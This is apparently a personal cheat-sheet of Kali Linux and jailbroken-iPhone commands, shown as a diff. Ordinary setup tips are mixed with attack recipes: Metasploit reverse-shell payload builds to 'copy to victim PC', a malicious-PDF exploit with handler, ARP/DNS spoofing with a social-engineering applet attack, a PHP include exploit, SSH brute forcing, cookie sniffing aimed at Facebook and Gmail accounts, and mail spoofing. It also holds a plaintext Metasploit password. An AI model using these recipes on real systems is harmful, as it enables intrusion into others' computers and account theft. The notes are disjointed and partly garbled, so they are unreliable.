+cat /var/log/dpkg.log | grep "\ install\ "
+#################### KILL dpkg ###########################
+sudo pkill dpkg
+########################### INstalling pppconfig #####################
+apt-get install ppp pppconfig
+#######################################################
+
+############# Scapy IOS installation ###################
+>>>>>>>>>>> Man In The Middle Attack <<<<<<<<<<<<<<<<<
+How to Install Scapy into your iDevice?
+
+
+first Jailbreak your iOS device(iPhone/iPad)
+
+> wget https://github.com/vessial/scapy/archive/master.zip
+
+install Python into your device.
+
+you can download python into your device from here http://cydia.radare.org/debs/python_2.7.3-3_iphoneos-arm.deb
+
+then ssh to your device : dpkg install python_2.7.3-3_iphoneos-arm.deb
+
+copy scapy and Crypto directory, dnet.pyx pcap.py scapy-2.1.-py2.7.egg-info to
+
+/usr/lib/python2.7/site-packages this directory.
+
+copy lib-dynload/_pcapmodule.so lib-dynload/dnet.so
+
+into /usr/lib/python2.7/lib-dynload directory
+
+enjoy it.
+
+vessial
+
+########################################################
+
+
+GIT CLONE : git clone https://github.com/schurpf/pyhk
+
+####### VLC PROBLEM & SOLUTION #############
+hexedit /usr/bin/vlc
+change geteuid to getppid
+###########################################
+
+apt-get install ruby1.9.1-full
+##################### Create payload ################
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.101 
+LPORT=4444 X > /root/Desktop/test.exe
+
+#####################################################
+
+
+apt-get install gems
+
+sudo apt-get dist-upgrade
+sudo apt-get upgrade
+sudo apt-get update
+
+
+1) #aptitude remove se-toolkit
+2) #aptitude purge se-toolkit
+3) #aptitude clean
+4) #aptitude autoclean
+
+aptitude search se-toolkit
+
+####################### INSTALL PYTHON setup.py ######################
+
+type: python setup.py install
+
+
+
+
+
+chmod 775 file name own file
+
+
+
+## keylogger making #####
+Best DNS (Domain Name Server) Backdoor Attack copy link and past, victim 
+from anywhere can trap into this attack remotely 
+what i was searching for a long time.
+
+$$$$$$$$$$$$$$$$$$$
+search dcerpc
+
+
+website attack: msfpayload php/meterpreter/reverse_tcp LHOST=your IP 
+LPORT=4444 R > payload.php
+edit payload.php file and remove "#" from first save.
+go and browse: your ip/index.php?page=http://zarabyte.com/txt/y.txt
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=boomboom.no-ip.biz 
+LPORT=4444 -f exe > qq.exe
+
+msf > use exploit/multi/handler
+msf > set payload windows/meterpreter/reverse_tcp_dns
+msf > set LHOST your ip
+msf > set LPORT 4444
+sessions -l 1
+sessions -l 2
+exploit
+
+That's it....
+copy it to victim PC
+
+DUC no ip.... 
+
+/usr/local/bin/noip2
+
+_____________________________________________________ Adobe reader kali linux _____________________________
+
+apt-get install acroread
+leafpad /etc/apt/sources.list
+add there: deb http://archive.canonical.com/ precise partner
+
+    apt-get update
+    apt-get install acroread
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Dock installation kali linux $$$$$$$$$$$$$$$$$$$$$$$$
+vim /etc/apt/sources.list
+add: deb http://download.tuxfamily.org/glxdock/repository/debian stable cairo-dock
+
+in terminal:
+wget -q http://download.tuxfamily.org/glxdock/repository/cairo-dock.gpg -O- | apt-key add -
+
+apt-get update
+
+apt-get install cairo-dock cairo-dock-plug-ins
+
+
+
+
+
+./msfconsole
+
+use exploit/windows/fileformat/adobe_utilprintf
+set filename XXX.pdf
+set payload windows/meterpreter/reverse_tcp
+set LHOST your ip
+set LPORT 4444
+exploit
+
+File has been created already.
+Now copy the file to Desktop (optional)
+
+type:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST your IP
+set LPORT 4444
+exploit
+
+after owining the PC
+type:
+run post/windows/manage/migrate
+
+#########################
+
+#######################  Hacking Computers keyloggers, webcam snap, 
+desktop capture, using Backtrack 5 - 2014 ############ 
+
+gedit /usr/local/share/ettercap/etter.dns
+
+find "# vim:ts=8:noexpandtab"
+
+find what is running on port: netstat -tulpn | grep :80
+
+then type in new line under "# vim:ts=8:noexpandtab"
+
+
+make sure that /pentest/exploits/set/config 
+
+gedit set_config   apache is set ON
+
+open ./set
+
+Go: now select:  > 1>2(website attack vectors)>1(java applet attack 
+method)>1(java)
+>14(ShellCodeExec Alphanum Shellcode ad through shellcodeexec (A/V 
+Safe)>
+1(Windows Meterpreter Reverse TCP)
+
+ettercap -T -i wlan0 -q -M arp:remote /192.168.0.101(your IP)/ /Target 
+IP -P dns_spoof
+
+Ex: ettercap -T -i wlan0 -q -M arp:remote /192.168.0.1/ /192.168.0.100/ 
+-P dns_spoof
+
+
+________________________________________phpmyadmin not found solution__________________________
+
+sudo ln -s /usr/share/phpmyadmin /var/www/
+
+Note: since 14.04 you may want to use /var/www/html/ instead of /var/www/
+
+If thats not working for you, you need to include phpmyadmin inside apache configuration.
+
+Open apache.conf using your favorite editor, mine is vim :)
+
+>sudo vim /etc/apache2/apache2.conf
+
+Then add the following line:
+
+>Include /etc/phpmyadmin/apache.conf 
+
+______________________________________________________________________________________
+
+
+		:::UPDATE METASPLOIT TO /OPT/METASPLOIT/    :::
+git clone https://github.com/rapid7/metasploit-framework.git msf3
+
+
+################## git SSL varification problem ######################
+git config --global http.sslVerify false
+then run git clone file.git 
+
+#####################SEARCH / Find ############################
+find / | grep mysqld
+#################################################
+
+
+--------------------- ################# -------------------
+apt-get remove pip
+apt-get install python-pip
+pip install urllib2
+
+
+########### starting apache2 ############
+/etc/init.d/apache2 restart
+/etc/init.d/apache reload
+apt-get install tasksel
+
+tasksel
+
+apt-get install phpmyadmin
+apt-get install apache2
+###################################### localhost / mysql / offline localhost problem iphone/ipad #############
+edit 
+> /ect/host
+127.0.0.1 localhost (for dns configuration)
+> /etc/network
+auto lo
+> /etc/my.cnf
+
+bind-address=addr = 127.0.0.1 (just open it)
+
+
+####################################### add mysql public key gpg #########################
+apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
+
+##################### mysql.sock problem and solution ############
+ps -aef | grep mysql (find running process of mysql.sock)
+OR
+lsof | grep mysql.sock
+OR
+% mysqladmin variables
+
+find /var -name *.sock
+lsof|grep -i mysql|grep sock
+
+FINAL SOLUTION  [FOR IOS/iphone/ipad/mac]
+
+mysqladmin [-h ... -u ... -p...] shutdown
+mysqld_safe --user=mysql &
+
+should recreate
+
+if it's suposed to be in tmp make sure mysql has write permission
+
+________________________ IF failed yet ___________________
+Then just uninstall ios-lighttpd-php-mysql,mysql-atv both from cydia
+and reinstall them it will solve the problem
+
+###################### soft link between two files ##############
+ln -s /var/lib/mysql/mysql.sock /tmp/
+
+__________________________________Enable lighttpd dir listing directory listing enable____________________
+vim /etc/lighttpd/lighttpd-atv.conf
+
+# vi /etc/lighttpd/lighttpd.conf
+
+
+
+dir-listing.activate = "enable"
+OR
+Append / modify
+
+server.dir-listing = "enable"
+################### Device info #############################################
+uname -a
+
+####################### Force install dpkg #########################
+dpkg -i --force-overwrite /var/cache/apt/archives/libjline-java_1.0-1_all.deb
+################# Take ownership of a directory recursively ### iPhone / iPad lighttpd and mysql solution #####
+
+chmod -R ugo+rwx
+
+-R --> Recursively
+ugo --> user, group, others
+rwx --> read, write, execute
+
+Reconfigure phpmyadmin: dpkg-reconfigure phpmyadmin
+
+...............APACHE RESTARTING...............
+
+sc config http start= demand
+
+curl -v localhost
+
+/etc/hosts
+
+/etc/init.d/apache2 restart
+/etc/init.d/apache2 stop
+
+cd /etc/apache2/ && grep -i listen *
+
+
+wget 127.0.0.1
+ssh 127.0.0.1 -p 6060 -v
+netstat -tpln
+netstat -rn
+iptables -nvL
+ip a
+ip route show table local
+traceroute 127.0.0.1
+ping 127.0.0.1
+
+
+echo "ServerName localhost" | sudo tee /etc/apache2/conf.d/fqdn.
+
+
+
+To remove: apt-get purge apache2 apache2-utils apache2.2-bin 
+or
+dpkg --purge --force-depends apache2-common
+
+
+apache2-common
+
+
+################ php dom class problem ################
+apt-get install php7.2-dom
+##############GPIO installation problem##############
+apt-get install python-dev
+apt-get install python-gpio  or
+install gpio tar file
+
+___________________________________________________
+$ sudo apt-get update
+$ sudo apt-get remove python-rpi.gpio python3-rpi.gpio
+$ sudo apt-get install python-pip python3-pip
+$ sudo pip-2.7 uninstall RPi.GPIO
+$ sudo pip-3.2 uninstall RPi.GPIO
+$ sudo apt-get install python-rpi.gpio python3-rpi.gpio
+#####################################################
+...............................................
+
+RESETTING PHPMYADMIN PASSWORD:
+
+
+/etc/mysql mysql -u root -p
+
+INSTALLING:::::::::
+
+apt-get install mysql-server  (*******)
+
+OR
+
+
+    1 Stop the MySQL server
+
+    sudo service mysql stop
+
+    2 Start mysqld
+
+	service mysql start
+
+    sudo mysqld --skip-grant-tables &
+
+    3 Login to MySQL as root
+
+    mysql -u root mysql
+
+OR 
+
+	mysql -u root -p
+
+    4 Change MYSECRET with your new root password
+
+    UPDATE user SET Password=PASSWORD('MYSECRET') WHERE User='root'; 
+FLUSH PRIVILEGES; exit;
+
+OR
+
+	mysqladmin password newpassword
+
+OR
+mysql -u root -p
+SET PASSWORD FOR 'root'@'localhost' = PASSWORD('MyNewPass');
+
+    5 Kill mysqld
+
+    sudo pkill mysqld
+
+    6 Start mysql
+
+    sudo service mysql start
+
+    Login to phpmyadmin as root with your new password
+
+
+OR
+
+apt-get --purge remove mysql-server mysql-common mysql-client
+
+apt-get install mysql-server mysql-common mysql-client
+
+mysqladmin -u root password your-new-password
+
+/etc/init.d/mysql restart
+
+mysql -u root -p
+
+Re-conf: dpkg-reconfigure mysql-server-N.N
+####################################apt-get install problem############################
+vim /etc/apt/source.list
+update it to real one
+
+deb http://http.kali.org/kali kali-rolling main contrib non-free
+deb http://http.kali.org/kali sana main non-free contrib
+deb http://security.kali.org/kali-security sana/updates main contrib non-free
+# For source package access, uncomment the following line
+# deb-src http://http.kali.org/kali sana main non-free contrib
+# deb-src http://security.kali.org/kali-security sana/updates main contrib non-free
+deb http://old.kali.org/kali moto main non-free contrib
+
+###################################Can not confirm noAllowPassword problem phpmyadmin solution################
+rename "config.sample.inc" to "config.inc.php"
+vim /var/www/phpmyadmin/config.inc.php
+
+>
+
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['AllowNoPasswordRoot'] = true;
+
+################ RAR/UNRAR ################
+
+unrar e file.rar
+
+#####################
+
+tar xf file.tar.xz ---> for all compressed file
+$ tar zxf file.tar.gz
+$ tar zxf file.tgz
+$ tar jxf file.tar.bz2
+$ tar jxf file.tbz2
+$unxz kali-1.1.0-rpi2.img.xz ----> for xf
+
+###### to make tar ball #######################
+
+tar -zcvf archive-name.tar.gz directory-name
+
+################## phpmyadmin mbstring not found #######################
+apt-get install libapache2-mod-php7.0 && apt-get install php7.0-mbstring
+
+#################################### GIT SSL certificate problem solution ##############
+use:
+env GIT_SSL_NO_VERIFY=true git clone http://yourgithub.git
+
+
+#################################### Move all to upper directory ########################
+mv * .[^.]* ..
+
+#######ZIP UNZIP#########
+zip -r pic.zip(new name with .zip) Pic(folder to zip)
+unzip Pic
+################
+
+netdiscover -r IP address/range
+
+nmap -sV -n Ip address
+
+
+medusa -h IP address -U /root/usr.txt -p password -e ns -M ssh -v 4
+
+
+
+ssh bbanter@ipaddress
+
+
+######## network scaner #######3
+nslookup -query=mx example.com
+
+
+
+############### Network reset ############
+
+
+ifconfig eth0 up
+/etc/init.d/networking restart
+
+ifconfig -a
+
+dmesg | grep -e eth0 -e bcm
+
+
+#####################
+Cookie hack to hack other facebook, gmail, etc auto refreash page 
+
+Line to terminal: wireshark
+filter : http.cookie contains datr
+---------------
+1. echo 1 > /proc/sys/net/ipv4/ip_forward
+2. airpspoof -i eth0 -t xxx.xxx.xxx [Default Gateway]
+
+####################
+
+mail spoofing:
+
+1. sendmail start (creating a mail server)
+2. open new terminal and type "telnet 127.0.0.1 25 (self server 
+localhost
+ and 25 no port is mailserver port of localhost)
+
+telnet localhost 25
+Trying ::1...
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+220 bt.foo.org ESMTP Postfix (Ubuntu)
+hello localhost
+502 5.5.2 Error: command not recognized
+hola localhost
+502 5.5.2 Error: command not recognized
+helo localhost
+250 bt.foo.org
+mail from: uiu025@gmail.com
+250 2.1.0 Ok
+rcpt to: uiu025@gmail.com
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject: hola
+
+hho
+.
+250 2.0.0 Ok: queued as E3908C92F7
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
+
+______________________________________________________________________________________________
+
+
+    Requirements
+
+    For the mail functions to be available, PHP requires an installed and working email system. The program to be used is defined by the configuration settings in the php.ini file.
+
+This means you have to install some sort of mailserver and configure php to use it. Usually this mailserver is postfix in Ubuntu. However - if the php side you are coding will eventually be stored on a hosting service's side (e.g. xmission), a mail server will most likely allready be installed there. In that case just test your site online instead of locally.
+
+If you need to test it on your own system or mean to host it on your own home-server than proceed with:
+Postfix Installation
+
+Installation: postfix Install postfix / sudo apt-get install postfix During the process you will be asked in which mode you want postfix installed. There are four possible modes:
+
+    Internet: Your own mail-server.
+    Satellite: An extern mail provider (e.g. Google) will be used for sending and mail. The server will not receive any mail.
+    Smarthost: Mixture between the two. Mail is storred locally but send through an extern mail provider.
+    Local only: Will not concern you. That's a system intern mailserver. You can only send mail from user to user on the system.
+
+The rest of the install options depend on your choice of this general configuration.
+
+Most likely you will choose a satellite install. That means mail will be send using an extern provider. As smtp-server (outgoing mail server) you will then have to specify your providers smpt. The rest of the options is self explanatory.
+Post Installation Configuration
+
+Most smtp-servers require a password authentication to send mail. So postfix will need to know that password. Also there are things like encryption to consider (which you'll have to google). This is how you configure postfix using password authentication (sasl):
+
+    Install libsasl2-modules Install libsasl2-modules and sasl2-bin Install sasl2-bin by clicking the Software Center icons or from terminal using:
+
+    sudo apt-get install libsasl2-2 libsasl2-modules sasl2-bin
+
+    Enable sasl-auth by adding these lines to /etc/postfix/main.cf
+
+     # add to /etc/postfix/main.cf
+     smtp_sasl_auth_enable = yes
+     smtp_sasl_security_options = noplaintext noanonymous
+     smtp_sasl_password_maps = hash:/etc/postfix/sasl_password
+
+    Create a file /etc/postfix/sasl_password with a line like:
+
+     smtp.gmail.com USERNAME@gmail.com:USERPASSWORD
+
+    Substitute the acutal password, username and smpt-address.
+
+    Update postfix:
+
+     sudo chmod 600 /etc/postfix/sasl_password # for safety of your smtp password
+     sudo postmap hash:/etc/postfix/sasl_password 
+     sudo postmap /etc/postfix/sender_canonical
+     sudo /etc/init.d/postfix restart   
+
+    You might have to circumvent the 'permission denied' bug by chwon postfix:postfix /etc/postfix beforehand.
+
+This should do it in most of the cases. Yet some smpt providers require a specific address as the sender or encryption.
+
+Related: PEAR::Mail interface might also be of intrest to you.
+
+
+
+
+
+##################### Python to PHP ##############
+
+Here is an example session that uses the GET method to retrieve a URL 
+containing parameters:
+>>>
+
+>>> import urllib
+>>> params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': 0})
+>>> f = urllib.urlopen("http://www.musi-cal.com/cgi-bin/query?%s" % 
+params)
+>>> print f.read()
+
+The following example uses the POST method instead:
+>>>
+
+>>> import urllib
+>>> params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': 0})
+>>> f = urllib.urlopen("http://www.musi-cal.com/cgi-bin/query", params)
+>>> print f.read()
+
+The following example uses an explicitly specified HTTP proxy, 
+overriding environment settings:
+>>>
+
+>>> import urllib
+>>> proxies = {'http': 'http://proxy.example.com:8080/'}
+>>> opener = urllib.FancyURLopener(proxies)
+>>> f = opener.open("http://www.python.org")
+>>> f.read()
+
+The following example uses no proxies at all, overriding environment 
+settings:
+>>>
+
+>>> import urllib
+>>> opener = urllib.FancyURLopener({})
+>>> f = opener.open("http://www.python.org/")
+>>> f.read()
+
+
+
+INSTALLING MODULE FOR PYTHON ##############################
+
+
+
+The answer there is clear. But let me explain to you as good as I can. 
+This error comes because requests module is not installed in your system
+
+Download the requests module to your system from here: 
+https://pypi.python.org/pypi/requests#downloads
+
+And extract it. Go to your command prompt/terminal and reach to the 
+folder you downloaded.There, you will see setup.py, the file that you 
+need to execute to install the requests module.
+
+
+
+>> python setup.py install 
+
+
+
+Installs the requests module
+
+
+################# RUN C ON TERMINAL ##################
+> always in super user mode:::::: otherwise it will give errorss.....
+> gcc test.c -o test
+> ./test
+
+
+
+###################### KEY WORDS FOR JAVASCRIPT INSJECTIONS 
+###################
+
+> vega (backtrack > vulnerability assesment > web vulnerability 
+assessment > web vulnerability scanner > vega)
+> wireshark
+> nikto
+> nc 192.168.1.102 80(net cut)
+> nmap -sV -p80,8080 192.168.1.102
+> nmap -n -Pn -sS -p80.8080 192.168.1.102
+> nmap -sP 192.168.1.102
+> dirbuster(backtrack > vulnerability assesment > web vulnerability 
+assessment > web application fuzzer scanner > dirbuster)
+       when browse: use > /usr/share/dirbuster/worldlist/
+
+> Burpsuit (backtrack > vulnerability assesment > web vulnerability 
+assessment > web application proxy > burpsuit)
+
+
+
+######################## Installing conky / cpu background / animated 
+background / system info ###############
+add repository :
+# Regular repositories:vim /etc/apt/source.list
+deb http://http.kali.org/kali sana main non-free contrib
+deb http://security.kali.org/kali-security sana/updates main contrib non-free
+# Source repositories
+deb-src http://http.kali.org/kali sana main non-free contrib
+deb-src http://security.kali.org/kali-security sana/updates main contrib non-free
+
+Save and close the file.
+
+apt-get install lm-sensors
+sensors-detect
+apt-get install conky
+
+use the following:
+vim .conkyrc
+Now follwoing code:
+_________________________________________________
+# UBUNTU-CONKY
+# A comprehensive conky script, configured for use on
+# Ubuntu / Debian Gnome, without the need for any external scripts.
+#
+# Based on conky-jc and the default .conkyrc.
+# INCLUDES:
+# - tail of /var/log/messages
+# - netstat connections to your computer
+#
+# -- Pengo (conky@pengo.us)
+#
+
+# Create own window instead of using desktop (required in nautilus)
+own_window yes
+own_window_type override
+own_window_hints below
+
+# Use double buffering (reduces flicker, may not work for everyone)
+double_buffer yes
+
+# fiddle with window
+use_spacer yes
+use_xft no
+
+# Update interval in seconds
+update_interval 3.0
+
+#Maximum Width of Window
+maximum_width 320
+
+# Minimum size of text area
+# minimum_size 250 5
+
+# Draw shades?
+draw_shades no
+
+# Text stuff
+draw_outline no # amplifies text if yes
+draw_borders no
+font arial
+uppercase no # set to yes if you want all text to be in uppercase
+
+# Stippled borders?
+stippled_borders 3
+
+# border margins
+border_margin 5
+
+# border width
+border_width 6
+
+# Default colors and also border colors, grey90 == #e5e5e5
+default_color FFFFCC
+
+own_window_colour brown
+own_window_transparent yes
+
+# Text alignment, other possible values are commented
+#alignment top_left
+alignment top_right
+#alignment bottom_left
+#alignment bottom_right
+
+# Gap between borders of screen and text
+gap_x 10
+gap_y 10
+
+# stuff after â€˜TEXTâ€™ will be formatted on screen
+
+TEXT
+$color
+${color CC9900}SYSTEM ${hr 2}$color
+$nodename $sysname $kernel on $machine
+
+${color CC9900}CPU ${hr 2}$color
+AMD Athlon(tm) 64 Socket 939 X2 Dual Core CPU 4200+
+
+Total CPU: ${cpu cpu0}%
+${color 597DB2}${cpubar}$color
+${cpugraph 000000 597DB2}
+Core 1: ${freq 1} MHz        Temprature: $color ${exec sensors|grep 'Core0'|awk '{print $3}'}
+${cpu cpu1}% ${color 597DB2}${cpubar cpu1}$color
+Core 2: ${freq 2} MHz        Temprature: $color ${exec sensors|grep 'Core1'|awk '{print $3}'}
+${cpu cpu2}% ${color 597DB2}${cpubar cpu2}$color
+
+NAME            PID	 CPU%  	MEM%
+${color CCFFFF}${top name 1} ${top pid 1} ${top cpu 1} ${top mem 1}
+${top name 2} ${top pid 2} ${top cpu 2} ${top mem 2}
+${top name 3} ${top pid 3} ${top cpu 3} ${top mem 3}
+${top name 4} ${top pid 4} ${top cpu 4} ${top mem 4}$color
+
+${color CC9900}MEMORY ${hr 2}$color
+RAM Used: ${mem}	RAM Free: ${memfree}/ ${memmax}
+ RAM: $memperc%  ${color FF6600} ${membar 6}$color
+Swap: $swapperc%   ${color FF6600} ${swapbar 6}$color
+
+${color CC9900}DISK ${hr 2}$color
+sdc5 ${fs_type} (Root): ${fs_free_perc /}% ${color FFFF33} ${fs_bar 6 /}$color
+sdc1 NTFS (Data): ${fs_free_perc /media/data}% ${color FFFF33} ${fs_bar 6 /media/data}$color
+
+${color CC9900}NETWORK (${addr eth1}) ${hr 2}$color
+Down: $color${downspeed eth1} k/s ${alignr}Up: ${upspeed eth1} k/s
+${downspeedgraph eth1 25,140 000000 ff0000} ${alignr}${upspeedgraph eth1
+25,140 000000 00ff00}$color
+Total: ${totaldown eth1} ${alignr}Total: ${totalup eth1}
+Inbound: ${tcp_portmon 1 32767 count} Outbound: ${tcp_portmon 32768
+61000 count}${alignr}Total: ${tcp_portmon 1 65535 count}
+
+${color CC9900}LOGGING ${hr 2}$color
+${color 339900}${execi 30 tail -n3 /var/log/messages | fold -w50}$color
+
+
+################################### installing tor ###################################
+apt-get install tor
+apt-get install tor vidalia [Note: In kali linux]
+
+every time when want to start tor just type:
+service tor restart
+###################### FTP ATTACK #################
+<?php
+$color = 'blue';
+if(isset($_GET['COLOR']))
+  $color = $_GET['COLOR']);
+  require($color . '.php');
+?>
+
+chown apache:apache -R 1
+
+msconsole
+use unix/webapp/php_include
+set PATH/1/
+set PHPURI /index.php?COLOR=XXpathXX
+set RHOST localhost
+set PAYLOAD php/reverse_php
+set LHOST 172.16.61.132
+exploit
+dir
+touch test.txt
+echo owned > test.txt
+http://172.16.61.132/test.txt
+############################# Utorrent Download and configure #########################
+		sk@server:~$ wget http://download.utorrent.com/linux/utorrent-server-3.0-25053.tar.gz
+sudo tar zxvf utorrent-server-3.0-25053.tar.gz -C /opt/
+sudo chmod -R 777 /opt/utorrent-server-v3_0/
+sudo ln -s /opt/utorrent-server-v3_0/utserver /usr/bin/utserver
+sudo apt-get install libssl0.9.8:i386
+utserver -settingspath /opt/utorrent-server-v3_0/
+http://ip-address:8080/gui/
+
+user:admin
+pass: (blank)
+
+
+For kali linux x64:::
+
+apt-get install qbittorrent
+#######################installing autocomplete problem vim #####################
+mkdir -p ~./vim/bundle
+cd ~./vim/bundle
+mkdir -p .git
+git submodule update --init --recursive
+
+
+
+############### PROBLEMS & SOLUTIONS #################
+In cydia/iPhone/iPad
+_____________________________
+if problem with pexpect install with python install after downloading the file......
+.................................................
+
+
+wget http://pexpect.sourceforge.net/pexpect-2.3.tar.gz
+tar xzf pexpect-2.3.tar.gz
+cd pexpect-2.3
+sudo python ./setup.py install
+ 
+# If your systems support yum or apt-get, you might be able to use the
+# commands below to install the pexpect package. 
+
+
+####################### Cydia Dissapearing / Cydia Problems ####################
+problems:
+
+> uitoolkit
+> cydia icon not found
+
+Ok....
+type in terminal......
+> apt-get purge [see what to install]
+> apt-get -f install[unmeet dependencies update and install]
+
+solved!!
+
+#######################
+Problem dpkg is on another process
+
+sol:
+kill proccess cydia / exit cydia 
+
+
+
+##########################################GCC problem killed 9 or permission denied iPhone ##################
+
+
+
+solution:
+
+$>gcc hello.c -o hello
+$>./hello
+	killed 9 or permission denied
+$>ldid -S ./hello
+$>./hello
+
+ok fine it's running
+
+____________________________________________GCC lib setup manually to ur device____________________
+1. You will need to Jailbreak the iPhone first, search on google for more info.
+2. Install OpenSSH from Cydia.
+3. Connect iPhone to your wireless network and SSH to it.
+4. Download this application using: wget http://www.syshalt.net/pub/iphone/gcc-iphone/fake-libgcc_1.0_iphoneos-arm.deb
+5. Install libcc using: dpkg –i fake-libgcc_1.0_iphoneos-arm.deb
+6. Install iphone-gcc using this command: apt-get install iphone-gcc
+(you can download this version from my website: iphone-gcc if does not work on your device the one that is installed by default)
+7. Download using: wget http://www.syshalt.net/iphone/gcc-iphone/sdk-2.0-headers.tar.gz
+8. Untar with command: tar -xvzf sdk-2.0-headers.tar.gz
+9. Enter in the new created folder with: cd include-2.0-sdk-ready-for-iphone
+10. Copy all files to include folder with command: cp –r * /usr/include
+11. Now type: cd .. in order to return to the previous folder
+12. Download using: wget http://www.syshalt.net/iphone/gcc-iphone/gcc_files.tar.gz
+13. Untar with command: tar -xvzf gcc_files.tar.gz
+14. Enter in the new created folder with command: cd gcc_files
+15. Copy all files to /usr/lib using command: cp –r * /usr/lib
+16. Install ldid to sign the application (this will prevent iOS to kill the application at startup) using: apt-get install ldid
+17. Sign your compilet aplication using: ldid –S ./hello
+18. Run the application using: ./hello 
+
+#######################
+
+sudo yum install pexpect.noarch
+
+# or
+
+sudo apt-get install python-pexpect
+
+
+
+setps setup set(social engineering toolkit)
+> pyobj
+> pyopenssl
+> crypto
+> python 2.7
+> ruby
+> gem
+
+TO RUN ARMITAGE GETTING ERROR: METASPLOIT'S RPC DEMON SHUTDOWN .....
+
+When using Linux the vast majority of errors tell you whats wrong .. so 
+it says it requires bundler installed so if you just google gem bundle 
+install metasploit you will see how to fix the error
+
+but this is how you fix that error
+
+
+
+Code:
+
+cd /opt/backbox/msf
+sudo gem install bundler
+sudo gem update 
+sudo gem update --system
+
+
+OR 
+
+UNINSTALL RUBY & GEMS 
+IT WILL SOLVE THE PROBLEMS
+
+
+######### Ruby remove dependancies ###########
+aptitude purge ruby
+
+
+.............................
+Metasploit permission problem/ Open problem from terminal:
+
+Get permission even in backtrack chmod +x filename
+
+Metasploit Server local: https://localhost:3790
+
+My metasploit user details:
+user: root
+pass: 12358voot#
+
+
+
+$$$$$$$$$$$$$$$$$ INSTALLING & CONFIGURING APACHE2 $$$$$$$$$$$$$$$$$$$$
+So anyway, I had to setup a LAMP server:
+sudo apt-get update sudo apt-get upgrade
+1
+2
+	
+sudo apt-get update
+sudo apt-get upgrade
+
+MySQL
+sudo apt-get install mysql-server mysql-client
+1
+	
+sudo apt-get install mysql-server mysql-client
+
+Apache
+sudo apt-get install apache2
+1
+	
+sudo apt-get install apache2
+
+PHP
+sudo apt-get install php5 libapache2-mod-php5 php5-mysql
+1
+	
+sudo apt-get install php5 libapache2-mod-php5 php5-mysql
+
+Restart Apache
+/etc/init.d/apache2 restart
+1
+	
+/etc/init.d/apache2 restart
+
+phpMyAdmin
+sudo apt-get install phpmyadmin
+1
+	
+sudo apt-get install phpmyadmin
+
+I don’t like to use Apache’s default http folder /var/www so I need to 
+update the apache2.conf file:
+sudo nano /etc/apache2/apache2.conf
+1
+	
+sudo nano /etc/apache2/apache2.conf
+
+Changing the default location will require me to make sure phpMyAdmin 
+continues to load on http://localhost/phpMyAdmin so at the end of the 
+same file I ll add the virtual host configuration for phpMyAdmin
+Include /etc/phpmyadmin/apache.conf
+1
+	
+Include /etc/phpmyadmin/apache.conf
+
+Restart Apache
+/etc/init.d/apache2 restart
+1
+	
+/etc/init.d/apache2 restart
+
+
+
+...........................
+burpsuite
+dirbuster
+vega
+msfconsole
+maltego
+nessus start
+sqlmap
+grendel-scan
+hydra-gtk
+set
+uniscan
+
+
+
+############################### Open Jdk/ Oracle problem ##########################################
+For Kali linux x64
+
+1. Download the latest Java SE SDK version.
+
+http://www.oracle.com/technetwork/jav...
+
+At the time of writing the filename and version was jdk-8u40-linux-x64.tar.gz
+
+2. Untar the Archive
+tar -xzvf /root/jdk-8u40-linux-x64.tar.gz
+mv jdk1.8.0_40 /opt
+cd /opt/jdk1.8.0_40
+
+3.This step registers the downloaded version of Java as an alternative, and switches it to be used as the default:
+
+update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_40/bin/java 1
+update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_40/bin/javac 1
+update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.s­o mozilla-javaplugin.so /opt/jdk1.8.0_40/jre/lib/amd64/libnpjp2.­so 1
+update-alternatives --set java /opt/jdk1.8.0_40/bin/java
+update-alternatives --set javac /opt/jdk1.8.0_40/bin/javac
+update-alternatives --set mozilla-javaplugin.so /opt/jdk1.8.0_40/jre/lib/amd64/libnpjp2.­so
+
+
+
+Jar file run:
+java -jar filename.jar
+
+4. test Java
+
+http://java.com/en/download/testjava.jsp
+
+
+For Kali linux x86
+
+tar -xzvf /root/jdk-8u40-linux-i586.tar.gz
+
+mv jdk1.8.0_40 /opt
+
+cd /opt/jdk1.8.0_40
+
+update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_40/bin/javac 1
+
+update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.s­o mozilla-javaplugin.so /opt/jdk1.8.0_40/jre/lib/i386/libnpjp2.s­o 1
+
+update-alternatives --set java /opt/jdk1.8.0_40/bin/java
+
+update-alternatives --set javac /opt/jdk1.8.0_40/bin/javac
+
+update-alternatives --set mozilla-javaplugin.so /opt/jdk1.8.0_40/jre/lib/i386/libnpjp2.s­o
+
+
+
+_____________________________________________________#######################################
+Error finding apt-get: dpkg --configure -a
+
+_________________ Permission on File ___________________________________
+chmod -R 777 filename
+chmod +x filename
+____________________ ssh enable on kali (connection refused)__________________
+service ssh status
+ufw allow ssh
+
+--
+and: service ssh start
+
+[Note: if not found ufw: apt-get install ufw]
+
+
+For getting permission on server:
+
+gedit : /etc/ssh/sshd_config
+
+change:
+
+PermitRootLogin without-password
+
+to
+
+PermitRootLogin yes
+__________________________________________ Radio Frequency tester && usb scanner_______________________________
+
+apt-get install rtlsdr-scanner
+type: rtlsdr-scanner
+
+USB: 
+apt-get install gpsd-clients
+apt-get install gpsd
+lsusb
+
+_______________________________ armitage problem metasploit start___________________________
+msfdb start
+msfdb init
+__________________________________________ Typing Bangla ________________________________________
+apt-get install ibus-m17n m17n-db m17n-contrib ibus-gtk
+
+type: ibus-daemon -xdr [Note: follow top right icon]
+ibus-setup
+___________________________________________ see my ip from terminal _____________________________
+apt-get install lynx
+lynx cmyip
+____________________________________________________
+type : packettracer 
+start packettracer cisco
+____________________________________________________________________________________
+				Multi screen Terminal
+
+
+
+You can do it in 'type: screen' the terminal multiplexer.
+
